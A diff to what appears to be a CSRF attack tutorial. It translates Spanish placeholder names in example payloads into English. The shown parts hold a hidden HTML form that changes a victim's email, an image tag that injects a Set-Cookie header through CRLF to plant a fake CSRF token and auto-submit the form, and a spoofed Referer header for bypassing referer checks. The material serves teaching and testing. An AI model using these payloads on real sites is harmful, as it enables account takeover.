@@ -27,7 +27,7 @@ CSRF attacks (Cross-site request forgery) is a type of malicious exploit that ai
 **CSRF basic mail**<br>
 It makes a request to the endpoint that changes the email and javascript confirms the request, which will change the mail just by visiting the page.
 
-Code from https://web-atacante.com/malicioso.html
+Code from https://web-attacker.com/malicioso.html
 
 ```html
 <html>
@@ -105,10 +105,10 @@ Since the token was validated in the cookie, we can send the request to change t
     <body>
         <form action="https://vulnerable-web.com/email/change" method="POST" >
             <input type="hidden" name="email" value="pwned@gmail.com">
-            <input type="hidden" name="csrf" value="tokenfalso">
+            <input type="hidden" name="csrf" value="faketoken">
         </form>
 		
-        <img src="https://vulnerable-web.com/?search=hat%0d%0aSet-Cookie:%20csrf=tokenfalso" onerror="document.forms[0].submit()">
+        <img src="https://vulnerable-web.com/?search=hat%0d%0aSet-Cookie:%20csrf=faketoken" onerror="document.forms[0].submit()">
     </body>
 </html>
 ```
@@ -149,7 +149,7 @@ By modifying the referer with javascript we can evade this validation and be abl
 ```
 - Referer validation accepts any header that contains the expected domain somewhere in the chain
 ```html
-Referer: https://atacante-web.com/?vulnerable-web.com
+Referer: https://web-attacker.com/?vulnerable-web.com
 ```
 
 **Referrer-Policy**
